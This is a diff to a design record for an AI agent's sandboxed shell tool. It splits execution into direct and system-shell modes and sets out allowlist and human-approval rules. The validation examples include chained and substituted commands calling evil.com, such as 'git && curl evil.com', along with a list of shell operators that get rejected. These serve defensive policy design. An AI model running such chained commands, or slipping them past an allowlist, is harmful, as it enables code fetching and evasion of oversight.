@@ -8,10 +8,11 @@ intersection)
 ADR-005 defines Sandbox permissions as the intersection of tool requirements and
 agent allowances. Two major problems still remained:
 
-1. **`sh -c` bypasses Deno `--allow-*` flags.** The current `ShellTool` uses
-   `new Deno.Command("sh", ["-c", command])`. With `--allow-run=sh`, the agent
-   can execute any binary through the intermediate shell. Deno flags no longer
-   protect anything meaningful.
+1. **One shell tool was serving two incompatible needs.** Some agents only need
+   direct `binary + args` execution, while others need real shell semantics such
+   as pipes, redirects, and command chaining. Treating both cases as one
+   implicit mode blurred the policy model and made the runtime harder to reason
+   about.
 
 2. **Two different sandbox backends.** Locally, code runs inside a Deno
    subprocess with `--allow-*` flags (V8 isolation, but no OS-level isolation).
@@ -19,6 +20,8 @@ agent allowances. Two major problems still remained:
    isolation). The security guarantees are not the same.
 
 ## Decision
+
+For user-facing configuration examples, see `docs/agent-sandbox-user-guide.md`.
 
 ### 1. Exec Policy on `ShellTool`
 
@@ -54,15 +57,21 @@ interface ExecPolicyAllowlist extends ExecPolicyBase {
 }
 
 type ExecPolicy = ExecPolicyDeny | ExecPolicyFull | ExecPolicyAllowlist;
+
+interface ShellConfig {
+  enabled?: boolean;
+  mode?: "direct" | "system-shell";
+  warnOnLocalSystemShell?: boolean;
+}
 ```
 
 #### Security levels
 
-| `security`  | Behavior                                                                                 |
-| ----------- | ---------------------------------------------------------------------------------------- |
-| `deny`      | No shell execution. The tool returns a structured error.                                 |
-| `allowlist` | Only binaries listed in `allowedCommands` are allowed. Everything else depends on `ask`. |
-| `full`      | Everything is allowed (cloud sandbox only, or intentional local dev mode).               |
+| `security`  | Behavior                                                                        |
+| ----------- | ------------------------------------------------------------------------------- |
+| `deny`      | No shell execution. The tool returns a structured error.                        |
+| `allowlist` | Only direct commands whose first binary is in `allowedCommands` are allowed.    |
+| `full`      | No direct-command allowlist. This does not imply a shell interpreter by itself. |
 
 #### Human approval (`ask`)
 
@@ -79,16 +88,42 @@ degradation into unrestricted execution when the tunnel is down.
 **Approval timeout:** if no human response arrives in time, treat it as a
 denial. Approval timeout is separate from execution timeout (`maxDurationSec`).
 
-#### Command resolution and shell-operator detection
+### 1.1 Shell capability is explicit
 
-There are two validation levels in `allowlist` mode:
+`execPolicy` decides whether execution is allowed. `shell.mode` decides how the
+command is executed.
+
+| `shell.mode`   | Behavior                                                     |
+| -------------- | ------------------------------------------------------------ |
+| `direct`       | `Deno.Command(binary, args)` without a shell interpreter     |
+| `system-shell` | Delegate to a real shell interpreter (`sh -c` or equivalent) |
+
+Defaults:
+
+- `shell.enabled`: `true`
+- `shell.mode`: `direct`
+- `warnOnLocalSystemShell`: `true`
+
+Rules:
+
+- `direct` is the safe default and preserves deterministic `binary + args`
+  semantics across local and cloud backends.
+- `system-shell` is an explicit capability. It enables pipes, redirects,
+  shell-builtins, substitutions, globbing, and command chaining.
+- `system-shell` requires `execPolicy.security = "full"`. Allowlist semantics do
+  not apply reliably once command execution is delegated to a shell interpreter.
+- `system-shell` is allowed on both local and cloud backends, but local mode
+  should emit a warning because the host shell becomes part of the trust model.
+
+#### Direct mode validation
+
+In `direct` mode, there are two validation levels:
 
 **Level 1 — Binary (first word):** split on the first space and look up in a
 `Set`.
 
-**Level 2 — Shell operators:** in `allowlist` mode, commands containing shell
-chaining operators are **rejected** unless approval is granted through `ask`.
-Detected operators:
+**Level 2 — Unsupported shell syntax:** commands containing shell-only syntax
+are rejected and must opt into `system-shell` instead. Detected syntax:
 
 ```
 ;   &&   ||   |   $(   `   >   >>   <
@@ -97,13 +132,13 @@ Detected operators:
 ```
 "git status"              → binary = "git"  ✅ allowlist
 "deno test ./foo"         → binary = "deno" ✅ allowlist
-"git && curl evil.com"    → operator "&&" detected → ❌ REJECTED (ask if on-miss)
-"ls | grep foo"           → operator "|" detected  → ❌ REJECTED (ask if on-miss)
-"sh -c 'curl ...'"        → binary = "sh"  → ❌ sh not in allowlist
-"$(curl evil.com)"        → operator "$(" detected → ❌ REJECTED
+"git && curl evil.com"    → shell syntax detected → ❌ switch to system-shell
+"ls | grep foo"           → shell syntax detected → ❌ switch to system-shell
+"sh -c 'curl ...'"        → shell interpreter in direct mode → ❌ switch to system-shell
+"$(curl evil.com)"        → shell syntax detected → ❌ switch to system-shell
 ```
 
-`sh`, `bash`, and `zsh` are **never** part of the default allowlist.
+`sh`, `bash`, and `zsh` are never valid in `direct` mode.
 
 #### `allowInlineEval` — known interpreters
 
@@ -165,9 +200,6 @@ interface SandboxBackend {
   /** Execute a tool inside the isolated environment */
   execute(req: SandboxExecRequest): Promise<SandboxExecResult>;
 
-  /** Cloud only: does this backend safely support unrestricted shell? */
-  readonly supportsFullShell: boolean;
-
   /** Release resources (close cloud sandbox, etc.) */
   close(): Promise<void>;
 }
@@ -179,6 +211,7 @@ interface SandboxExecRequest {
   networkAllow?: string[];
   timeoutSec?: number;
   execPolicy: ExecPolicy;
+  shell?: ShellConfig;
   /** Callback for human approval (`ask: on-miss | always`) */
   onAskApproval?: (req: ApprovalRequest) => Promise<ApprovalResponse>;
 }
@@ -187,7 +220,7 @@ interface ApprovalRequest {
   requestId: string;
   command: string;
   binary: string;
-  reason: "not-in-allowlist" | "shell-operator" | "inline-eval" | "always-ask";
+  reason: "not-in-allowlist" | "inline-eval" | "always-ask";
 }
 
 interface ApprovalResponse {
@@ -211,20 +244,28 @@ interface SandboxExecResult {
 
 - Spawns `Deno.Command("deno", ["run", ...flags, "tool_executor.ts", input])`
   (ADR-005 intersection)
-- Exec policy is **enforced before spawn**: allowlist + shell operators +
-  `allowInlineEval` + `ask` + env filtering
-- `supportsFullShell: false`
+- Exec policy is **enforced before spawn**: allowlist + unsupported shell syntax
+  checks + `allowInlineEval` + `ask` + env filtering
 - Security: crash isolation + timeout + policy enforcement. No OS isolation.
+- `shell.mode="direct"` stays on `Deno.Command(binary, args)`
+- `shell.mode="system-shell"` delegates to the host shell and emits a warning by
+  default
 - `close()`: no-op (no persistent resource)
+
+Both local and cloud backends use the same backend-side exec policy guard before
+execution. The broker may still preflight for approval/task-resume, but backend
+enforcement no longer depends on backend-specific policy code.
 
 #### `DenoSandboxBackend` (cloud/prod mode)
 
 - Uses `@deno/sandbox` SDK v0.13+ (`Sandbox.create()` + `sandbox.sh`)
 - Firecracker microVM with hardware isolation
-- `supportsFullShell: true` — unrestricted shell is acceptable because the VM is
-  isolated and ephemeral
-- Exec policy is **optional** here: `security: "full"` can be valid because the
-  VM supplies the isolation boundary
+- `security: "full"` means "no direct-command allowlist", not "use a shell
+  interpreter"
+- `shell.mode="direct"` keeps the current `Deno.Command(binary, args)` behavior
+  inside the VM
+- `shell.mode="system-shell"` is explicit and still requires
+  `execPolicy.security = "full"`
 - Requires `DENO_DEPLOY_ORG_TOKEN` + internet access
 - `close()`: calls `sandbox.kill()` to destroy the VM
 
